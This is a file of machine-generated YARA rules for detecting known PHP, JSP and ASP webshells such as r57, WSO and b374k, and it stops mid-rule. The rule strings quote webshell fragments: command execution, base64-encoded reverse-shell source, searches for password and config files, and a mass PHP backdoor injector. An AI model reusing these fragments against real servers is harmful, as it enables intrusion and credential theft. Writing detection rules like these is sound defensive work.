rule _in_Browser_download_warn_ma_leo_jfolder01_jsp_File_browser_3_JFolder_shell1_webshell_nc_jsp_400_176 {
   meta:
      description = "webshell - from files in.jsp, Browser.jsp, download.jsp, warn.jsp, ma.jsp, leo.jsp, jfolder01.jsp, jsp_File_browser.jsp, 3.jsp, JFolder.jsp, shell1.jsp, webshell-nc.jsp, jsp.jsp, 400.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash2 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash3 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
      hash4 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash5 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
      hash6 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash7 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash8 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
      hash9 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
      hash10 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash11 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash12 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
      hash13 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash14 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
   strings:
      $s1 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword ascii
      $s2 = "long time = System.currentTimeMillis() - starttime;" fullword ascii
      $s3 = "UplInfo info = (UplInfo) uploadTable.get(fName);" fullword ascii
      $s4 = "public String getUprate() {" fullword ascii
      $s5 = "public String getTimeEstimated() {" fullword ascii
      $s6 = "public String getTimeElapsed() {" fullword ascii
      $s7 = "buf.append(conv2Html(st.charAt(i)));" fullword ascii
      $s8 = "uploadTable.put(fName, info);" fullword ascii
      $s9 = "public int getPercent() {" fullword ascii
      $s10 = "UploadMonitor.set(fileInfo.clientFileName, uplInfo);" fullword ascii
      $s11 = "request.setAttribute(\"error\", \"Upload aborted\");" fullword ascii
      $s12 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword ascii
      $s13 = "uplInfo.currSize += read;" fullword ascii
      $s14 = "static UplInfo getInfo(String fName) {" fullword ascii
      $s15 = "static Hashtable uploadTable = new Hashtable();" fullword ascii
      $s16 = "uploadTable.remove(fName);" fullword ascii
      $s17 = "return convertFileSize(uprate) + \"/s\";" fullword ascii
      $s18 = "time = totalSize * time / currSize;" fullword ascii
      $s19 = "long uprate = currSize * 1000 / time;" fullword ascii
      $s20 = "uplInfo.aborted = true;" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _job_ma4_ha_JspWebshell_1_2_2_520_ma1_177 {
   meta:
      description = "webshell - from files job.jsp, ma4.jsp, ha.jsp, JspWebshell 1.2.jsp, 2.jsp, 520.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash2 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
      hash3 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash4 = "447696b43af95310a23b953a8822b97a1bdd30f6b8164c890d82763cf022a966"
      hash5 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
      hash6 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
      hash7 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "proc = runtime.exec(cmd);" fullword ascii
      $s2 = "if (session.getAttribute(\"password\") == null) {" fullword ascii
      $s3 = "password = (String)session.getAttribute(\"password\");" fullword ascii
      $s4 = "session.setAttribute(\"password\", password);" fullword ascii
      $s5 = "Process proc = null;" fullword ascii
      $s6 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword ascii
      $s7 = "if (password.equals(_password)) {" fullword ascii
      $s8 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB2312\"));" fullword ascii
      $s9 = "if (validate(password) == false) {" fullword ascii
      $s10 = "Runtime runtime = Runtime.getRuntime();" fullword ascii
      $s11 = "while ((nBytes = in.read(buffer, 0, 1024)) != -1) {" fullword ascii
      $s12 = "insReader.close();" fullword ascii
      $s13 = "String cmd = \"\";" fullword ascii
      $s14 = "if (! tmpFile.delete()) {" fullword ascii
      $s15 = "File tmpFile = null;" fullword ascii
      $s16 = "out.println(\"<div align=\\\"center\\\"><font color=\\\"red\\\"><li>" fullword ascii
      $s17 = "retStr += new String(tmpBuffer, 0, nRet);" fullword ascii
      $s18 = "char[] tmpBuffer = new char[1024];" fullword ascii
      $s19 = "out.write(buffer, 0, nBytes);" fullword ascii
      $s20 = "InputStreamReader insReader = null;" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp___1__asp__1___2014_10_23_14_54_16_asp__1__UnKnown_Vip__1__asp_178 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, asp (1)__2014-10-23-14-54-16.asp, asp (1).asp, UnKnown Vip (1).asp, asp (1).asp, .asp, asp.asp, UnKnown Vip.asp, asp (1)__2014-10-23-14-54-16.asp, vps.asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash4 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash5 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash6 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash7 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash8 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash9 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash10 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash11 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash12 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "RRS\"<form name='addrform' method='post' action='\"&URL&\"' target='_parent'>\"" fullword ascii
      $s2 = "<br>\"):Else:RRS(targetip & \":\" & portNum & \".......<font color=red>" fullword ascii
      $s3 = "RRS\"<script language='javascript'>\"" fullword ascii
      $s4 = "RRS\"</script>\"" fullword ascii
      $s5 = "RRS\"<input name='c' type='hidden' id='c' value='\"&cmd&\"' size='50'>\"" fullword ascii
      $s6 = "RRS\"<form method='post' name='goldsun'>\"" fullword ascii
      $s7 = "RRS\"<form method=post>\"" fullword ascii
      $s8 = "RRS\"setTimeout(\"\"document.all.goldsun.submit();\"\",4000);\"" fullword ascii
      $s9 = "RRS\"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='0'></iframe>\"" fullword ascii
      $s10 = "RRS\"<input name='u' type='hidden' id='u' value='\"&user&\"'></td>\"" fullword ascii
      $s11 = "RRS\"<input name='p' type='hidden' id='p' value='\"&pass&\"'></td>\"" fullword ascii
      $s12 = "RRS\"<input name='port' type='hidden' id='port' value='\"&port&\"'></td>\"" fullword ascii
      $s13 = "RRS\"<input name='FolderPath' style='width:100%' value='\"&Session(\"FolderPath\")&\"'>\"" fullword ascii
      $s14 = "RRS\"setTimeout('document.all.goldsun.submit();',4000);\"" fullword ascii
      $s15 = "RRS \"<a href='javascript:FullForm(\"\"\"&replace(str1,\"\\\",\"\\\\\")&\"\"\",\"\"DelFile\"\")'onclick='return yesok()' class='" ascii
      $s16 = "RRS\"<table width='100%'>\"" fullword ascii
      $s17 = "if Fpath=\"\\\" then Fpath=Server.MapPath(\"\\\")" fullword ascii
      $s18 = "RRS\"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>\"" fullword ascii
      $s19 = "M=request(\"M\")" fullword ascii
      $s20 = "pcfile=request(\"pcfile\")" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_4_b374k_2_5_source_b374k_2_6_source_b374k_2_3_b374k_2_7_source_179 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.4.php, b374k-2.5.source.php, b374k-2.6.source.php, b374k-2.3.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash3 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash4 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash5 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
      hash6 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "// give the code/command you want to execute in base64 format" fullword ascii
      $s2 = "// note that it will not works if shell password is empty ($s_pass);" fullword ascii
      $s3 = "$s_login_time = 3600 * 24 * 7; // cookie time (login)" fullword ascii
      $s4 = "// this example using command 'uname -a' in base64 format (cmd=dW5hbWUgLWE=)" fullword ascii
      $s5 = "// check shell permission to access program" fullword ascii
      $s6 = "// recommended ways is using POST DATA" fullword ascii
      $s7 = "if(is_callable('shell_exec')){" fullword ascii
      $s8 = "if(is_callable('exec')) {" fullword ascii
      $s9 = "$s_auth = true;" fullword ascii
      $s10 = "$s_win = (strtolower(substr($s_system,0,3)) == \"win\")? true : false;" fullword ascii
      $s11 = "$s_result .= \"<tr><td>php</td><td>\".phpversion().\"</td></tr>\";" fullword ascii
      $s12 = "else $s_auth = true;" fullword ascii
      $s13 = "// This is a feature where you can control this script from another apps/scripts" fullword ascii
      $s14 = "// find writable dir" fullword ascii
      $s15 = "$s_info .= \"<tr><td>\".$s_software.\"</td></tr>\";" fullword ascii
      $s16 = "$s_result .= \"<table><tr>\";" fullword ascii
      $s17 = "$s_result .= \"</table></div>\";" fullword ascii
      $s18 = "$s_result .= \"</div>\";" fullword ascii
      $s19 = "// sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo" fullword ascii
      $s20 = "// zip function" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_gfs_sh_r57_kartal_r57_r57_iFX_180 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, gfs_sh.php, r57_kartal.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash5 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash6 = "c8df75173ff2c9fae9980b311fbf23740b47481aec2175218d7ea99db5c31770"
      hash7 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash8 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash9 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd" fullword ascii
      $s2 = "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb" fullword ascii
      $s3 = "7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2" fullword ascii
      $s4 = "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ" fullword ascii
      $s5 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I" fullword ascii
      $s6 = "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp" fullword ascii
      $s7 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI" fullword ascii
      $s8 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword ascii
      $s9 = "lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=\";" fullword ascii
      $s10 = " exit();" fullword ascii
      $s11 = "JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV" fullword ascii
      $s12 = "Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N" fullword ascii
      $s13 = "GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt" fullword ascii
      $s14 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword ascii
      $s15 = "b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9" fullword ascii
      $s16 = "$back_connect_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC" fullword ascii
      $s17 = "dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp" fullword ascii
      $s18 = "Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i" fullword ascii
      $s19 = "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR" fullword ascii
      $s20 = "VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_other_decode_wso_4_2_3_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_181 {
   meta:
      description = "webshell - from files wso-4.2.4.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash3 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash4 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash5 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash6 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash7 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash8 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash9 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash10 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash11 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "\"find config* files\" => \"find / -type f -name \\\"config*\\\"\"," fullword ascii
      $s2 = "\"find config* files in current dir\" => \"find . -type f -name \\\"config*\\\"\"," fullword ascii
      $s3 = "\"find config.inc.php files\" => \"find / -type f -name config.inc.php\"," fullword ascii
      $s4 = "\"locate dump files\" => \"locate dump\"," fullword ascii
      $s5 = "\"find all service.pwd files\" => \"find / -type f -name service.pwd\"," fullword ascii
      $s6 = "\"find all .htpasswd files\" => \"find / -type f -name .htpasswd\"," fullword ascii
      $s7 = "\"locate config.dat files\" => \"locate config.dat\"," fullword ascii
      $s8 = "die('Shell has been removed');" fullword ascii
      $s9 = "\"find all .bash_history files\" => \"find / -type f -name .bash_history\"," fullword ascii
      $s10 = "\"find all suid files\" => \"find / -type f -perm -04000 -ls\"," fullword ascii
      $s11 = "\"find all sgid files\" => \"find / -type f -perm -02000 -ls\"," fullword ascii
      $s12 = "\"find suid files in current dir\" => \"find . -type f -perm -04000 -ls\"," fullword ascii
      $s13 = "\"find all .fetchmailrc files\" => \"find / -type f -name .fetchmailrc\"," fullword ascii
      $s14 = "\"locate config* files \" => \"locate config\"," fullword ascii
      $s15 = "\"locate config.inc files\" => \"locate config.inc\"," fullword ascii
      $s16 = "\"locate config.default.php files\" => \"locate config.default.php\"," fullword ascii
      $s17 = "\"locate config.php files\" => \"locate config.php\"," fullword ascii
      $s18 = "\"locate proftpd.conf files\" => \"locate proftpd.conf\"," fullword ascii
      $s19 = "\"locate vhosts.conf files\" => \"locate vhosts.conf\"," fullword ascii
      $s20 = "\"locate httpd.conf files\" => \"locate httpd.conf\"," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _qyt0dHv1_v4xGus6X_182 {
   meta:
      description = "webshell - from files qyt0dHv1.php, v4xGus6X.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9507cfcb16c1a7f91c2ec0b93393615e85fb7834c10c58c2f351f0c69bdee285"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
   strings:
      $s1 = "echo 'failed to inject '.$injectj00.'<br>';" fullword ascii
      $s2 = "$lolinject = $_POST['injectthis'];" fullword ascii
      $s3 = "<td>Create A backdoor by injecting this code in every php file of current directory</td>" fullword ascii
      $s4 = "if (fputs($fp,$lolinject))" fullword ascii
      $s5 = "foreach (glob($mypath) as $injectj00) " fullword ascii
      $s6 = "$fp=fopen($injectj00,$mode);" fullword ascii
      $s7 = "if($injectj00 == __FILE__)" fullword ascii
      $s8 = "if(substr($_POST['pathtomass'], -1) == \"\\\\\")" fullword ascii
      $s9 = "$users=@file('/etc/passwd');" fullword ascii
      $s10 = "echo '<br><font class=txt size=3>'.$injectj00.' was injected<br></font>';" fullword ascii
      $s11 = "print \"$val:\";" fullword ascii
      $s12 = "echo '<b>'.$_POST['pathtomass'].' is not available!</b>';" fullword ascii
      $s13 = "$ara = posix_getpwuid($uid);" fullword ascii
      $s14 = "if (is_dir($_POST['pathtomass'])) " fullword ascii
      $s15 = "$mypath = $_POST['pathtomass'] .$directorysperator. \"*.\".$filetype;" fullword ascii
      $s16 = "$mypath = $_POST['pathtomass'] . \"*.\".$filetype;" fullword ascii
      $s17 = "<form method='POST'>" fullword ascii
      $s18 = "$fp3 = fopen('.htaccess','w');" fullword ascii
      $s19 = "while (list ($key, $val) = each($ara))" fullword ascii
      $s20 = "$TEST=@file('/etc/passwd');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _404_in_Jsp_leo_jfolder01_JFolder_shell1_jsp_suiyue_183 {
   meta:
      description = "webshell - from files 404.jsp, in.jsp, Jsp.jsp, leo.jsp, jfolder01.jsp, JFolder.jsp, shell1.jsp, jsp.jsp, suiyue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
      hash2 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash3 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
      hash4 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash5 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash6 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash7 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash8 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash9 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
   strings:
      $s1 = "\",\"Execute\"};" fullword ascii
      $s2 = " <b>\"+strDir+\"</b></td><td>\" + getDrivers() + \"</td></tr></table><br>\\r\\n\");" fullword ascii
      $s3 = "String[] strExecute      = {\"" fullword ascii
      $s4 = "out.println(\"<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolord" ascii
      $s5 = "\",\"Command Window\"};" fullword ascii
      $s6 = "\",\"Download\"};" fullword ascii
      $s7 = "String[] strCommand      = {\"CMD " fullword ascii
      $s8 = "String[] strFileOperation= {\"" fullword ascii
      $s9 = "\"+strTmpFile+\"<p>\");" fullword ascii
      $s10 = "\",\"File Name\"};" fullword ascii
      $s11 = "\",\"Save\"};" fullword ascii
      $s12 = "\",\"Back\"};" fullword ascii
      $s13 = " \"+e.toString()+\"</font>\");" fullword ascii
      $s14 = "\"+strPath+\"<p>\");" fullword ascii
      $s15 = "\",\"Current Folder\"};" fullword ascii
      $s16 = " <input type=text name=file2 size=40 value='\"+strDir+\"'><p>\");" fullword ascii
      $s17 = "rk=#FFFFFF><tr><td width='30%'>\"+strCurrentFolder[languageNo]+\"" fullword ascii
      $s18 = " \"+strPath+\"<p>\");" fullword ascii
      $s19 = "\",\"Move\"};" fullword ascii
      $s20 = "\",\"Parent Folder\"};" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( 8 of them )
      ) or ( all of them )
}

rule _12302_123_184 {
   meta:
      description = "webshell - from files 12302.jsp, 123.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b8955bc502fccaab2ef4719653480facb9576bc57632e248eaaa3f519f972ca2"
      hash2 = "1b4f4005e8875436be8f477427d977e811130dfcc18f627915a7c5e80a5696e5"
   strings:
      $s1 = "            out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request." ascii
      $s2 = "    <form name=\"frmUpload\" method=\"post\" action=\"\">    " fullword ascii
      $s3 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>    " fullword ascii
      $s4 = "   String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
      $s5 = "<%@page contentType=\"text/html;charset=gb2312\"%>    " fullword ascii
      $s6 = "            pt.write(context.getBytes());    " fullword ascii
      $s7 = "  <head>    " fullword ascii
      $s8 = "   String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
      $s9 = "   if(request.getParameter(\"context\")!=null)    " fullword ascii
      $s10 = "  </head>    " fullword ascii
      $s11 = "    <input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword ascii
      $s12 = "    <title>JspDo Code By Xiao.3</title>    " fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 6KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_2_5_source_b374k_2_6_source_b374k_2_3_185 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-2.5.source.php, b374k-2.6.source.php, b374k-2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash3 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash4 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
   strings:
      $s1 = "//$s_server_ip = gethostbyname($_SERVER[\"HTTP_HOST\"]);" fullword ascii
      $s2 = "$s_result .= \"<tr><td>ruby</td><td>\".exe(\"ruby -v\").\"</td></tr>\";" fullword ascii
      $s3 = "if($s_python) $s_result .= \"<tr><td>python</td><td>\".exe(\"python -V\").\"</td></tr>\";" fullword ascii
      $s4 = "$s_posix = (function_exists(\"posix_getpwuid\") && function_exists(\"posix_getgrgid\"))? true : false;" fullword ascii
      $s5 = "if($s_java) $s_result .= \"<tr><td>java</td><td>\".str_replace(\"\\n\", \", \", exe(\"java -version\")).\"</td></tr>\";" fullword ascii
      $s6 = "2 => array(\"pipe\", \"w\")" fullword ascii
      $s7 = "\"PHP Configuration\" => INFO_CONFIGURATION," fullword ascii
      $s8 = "if(!empty($_REQUEST['s_pass'])){" fullword ascii
      $s9 = "if(strtolower(trim($s_pass)) == strtolower(trim($_REQUEST['s_pass']))){" fullword ascii
      $s10 = "//$s_my_ip = $_SERVER['REMOTE_ADDR'];" fullword ascii
      $s11 = "if(!empty($_REQUEST['dltype']) && !empty($_REQUEST['dlpath'])){" fullword ascii
      $s12 = "//bind_pl bind_py bind_rb bind_c bind_win bind_php back_pl back_py back_rb back_c back_win back_php" fullword ascii
      $s13 = "$s_java = check_access(\"java\");" fullword ascii
      $s14 = "\"PHP Variables\" => INFO_VARIABLES" fullword ascii
      $s15 = "$s_server_ip;" fullword ascii
      $s16 = "elseif(isset($_REQUEST['eval'])){" fullword ascii
      $s17 = "// sqltype : mysql, mssql, oracle, pgsql, odbc, pdo" fullword ascii
      $s18 = "\"PHP General\" => INFO_GENERAL," fullword ascii
      $s19 = "elseif(!empty($_REQUEST['mkdir'])){" fullword ascii
